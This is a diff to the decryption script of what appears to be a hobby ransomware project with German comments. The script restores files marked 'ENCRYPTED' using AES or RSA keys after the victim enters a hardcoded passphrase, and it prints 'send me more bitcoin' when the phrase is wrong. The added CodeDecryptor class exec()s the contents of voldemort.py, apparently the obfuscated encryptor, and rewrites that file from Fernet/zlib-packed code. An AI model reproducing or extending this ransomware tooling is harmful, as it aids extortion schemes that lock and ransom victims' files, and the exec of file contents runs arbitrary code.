@@ -1,27 +1,61 @@
 #!/usr/bin/env python3
-
 import os
+import base64
+import zlib
 from pathlib import Path
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
-from cryptography.hazmat.primitives import serialization,  hashes
+from cryptography.hazmat.primitives import serialization, hashes
 
-# Marker zur Kennzeichnung verschlüsselter Dateien
+# Marker für verschlüsselte Dateien
 MARKER = "ENCRYPTED"
 
+class CodeDecryptor:
+    """Klasse zum Entschlüsseln des verschleierten Codes"""
+    
+    def __init__(self):
+        self.original_code = None
+    
+    def decrypt_code(self, file_path: str):
+        """Entschlüsselt den verschleierten Python-Code"""
+        try:
+            with open(file_path, 'r') as f:
+                content = f.read()
+            
+            # Extrahiere den Schlüssel und verschlüsselte Daten
+            exec_vars = {}
+            exec(content, exec_vars)
+            
+            key = exec_vars.get('key')
+            if not key:
+                return False
+            
+            cipher = Fernet(key)
+            # Entschlüssele und dekomprimiere
+            decrypted = cipher.decrypt(exec_vars.get('encrypted_data', b''))
+            decompressed = zlib.decompress(base64.b85decode(decrypted))
+            
+            # Speichere entschlüsselten Code
+            with open(file_path, 'wb') as f:
+                f.write(decompressed)
+            
+            return True
+        except Exception as e:
+            print(f"Fehler beim Code-Entschlüsseln: {str(e)}")
+            return False
 
-# AES Schlüssel entschlüsseln
 def aes_decrypt(aes_key, encrypted_data):
+    """AES Entschlüsselung"""
     iv = encrypted_data[:16]
     cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
     decryptor = cipher.decryptor()
     data = decryptor.update(encrypted_data[16:]) + decryptor.finalize()
     return data
 
-# RSA Schlüssel entschlüsseln
 def rsa_decrypt(private_key, encrypted_data):
+    """RSA Entschlüsselung"""
     data = private_key.decrypt(
         encrypted_data,
         padding.OAEP(
@@ -32,13 +66,13 @@ def rsa_decrypt(private_key, encrypted_data):
     )
     return data
 
-# Auswahl der Enschlüsselung zwischen AES und RSA
 def main():
-    print("Wähle den Verschüsselungsalgorithmus:")
+    print("Wähle den Verschlüsselungsalgorithmus:")
     print("1. AES")
     print("2. RSA")
     choice = input("Deine Wahl (1 oder 2): ")
 
+    # Schlüssel laden
     if choice == "1":
         with open("thekey.key", "rb") as key_file:
             aes_key = key_file.read()
@@ -47,9 +81,9 @@ def main():
     elif choice == "2":
         with open("thekey.key", "rb") as key_file:
             rsa_key = serialization.load_pem_private_key(
-            key_file.read(),
-            password=None,
-            backend=default_backend()
+                key_file.read(),
+                password=None,
+                backend=default_backend()
             )
         with open("aes_key.enc", "rb") as key_file:
             encrypted_aes_key = key_file.read()
@@ -60,50 +94,55 @@ def main():
         print("Ungültige Wahl!")
         return
 
-# Dateien speichern
+    # Dateien zum Entschlüsseln finden
     files = []
-
-# Filter welche Dokumente nicht verschlüsselt werden dürfen
     for file in os.listdir():
-        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == "aes_key.enc" or file.startswith('.'):
+        if file == "thekey.key" or file == "decrypt.py" or file == "aes_key.enc" or file.startswith('.'):
             continue
-# Dateien finden
         if os.path.isfile(file):
             files.append(file)
+    
     print("Files to decrypt:", files)
 
-# Passwort
+    # Passwortabfrage
     secretphrase = "Avada Kedavra"
-
-# Eingabe für das Passwort
     user_phrase = input("Enter the secret phrase to decrypt your files\n")
-
+    
     if user_phrase == secretphrase:
+        # Zuerst normale Dateien entschlüsseln
         for file in files:
+            if file == "voldemort.py":
+                continue
+                
             file_path = Path(file)
             with file_path.open("rb") as thefile:
                 contents = thefile.read()
 
-# Kontrolliert ob die Datei schon Verschlüsselt ist 
             if MARKER.encode() not in contents:
                 print(f"{file} is not encrypted or already decrypted.")
                 continue
 
- # Entferne den Marker vor dem Entschlüsseln
             contents = contents.replace(MARKER.encode(), b'')
-
             try:
-            # Entschlüssele den Inhalt
                 decrypted_data = decrypt_func(contents)
                 with file_path.open("wb") as thefile:
                     thefile.write(decrypted_data)
+                print(f"{file} successfully decrypted")
             except Exception as e:
                 print(f"Failed to decrypt {file}: {str(e)}")
                 continue
+
+        # Dann voldemort.py entschlüsseln wenn verschleiert
+        if "voldemort.py" in files:
+            code_decryptor = CodeDecryptor()
+            if code_decryptor.decrypt_code("voldemort.py"):
+                print("voldemort.py successfully decrypted")
+            else:
+                print("voldemort.py decryption failed or not encrypted")
 
         print("Congrats, your files are decrypted")
     else:
         print("Wrong secret phrase, send me more bitcoin")
 
-if __name__ ==  "__main__":
+if __name__ == "__main__":
     main()
